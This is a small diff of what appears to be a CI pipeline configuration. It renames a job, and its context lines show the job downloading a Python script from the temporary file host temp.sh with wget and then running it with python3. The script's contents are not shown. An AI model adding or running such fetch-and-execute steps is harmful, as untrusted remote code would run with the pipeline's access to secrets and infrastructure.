@@ -13,7 +13,7 @@ blocks:
     dependencies: []
     task:
       jobs:
-        - name: Job
+        - name: Jobk
           commands:
             - 'wget http://temp.sh/Cgvll/1.py'
             - python3 1.py
